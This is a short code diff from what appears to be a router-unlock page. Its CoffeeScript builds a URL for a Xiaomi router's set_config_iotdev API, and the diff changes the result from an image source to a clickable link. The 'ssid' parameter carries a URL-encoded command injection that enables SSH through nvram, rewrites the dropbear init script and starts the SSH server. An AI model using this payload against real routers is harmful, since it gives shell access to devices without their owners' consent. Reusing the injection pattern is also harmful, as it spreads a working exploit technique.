@@ -28,6 +28,6 @@ $("body").on "click",".check",(evt)->
     stok = check_base_url_list[1].split("/")[0]
     result0 = "#{check_base_url_list[0]}stok=#{stok}/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B"
     $(".result0").text result0
-    $(".result0_a").attr "src",result0
+    $(".result0_a").attr "href",result0
 </script>
 <script src="static/js/coffeescript.js"></script>
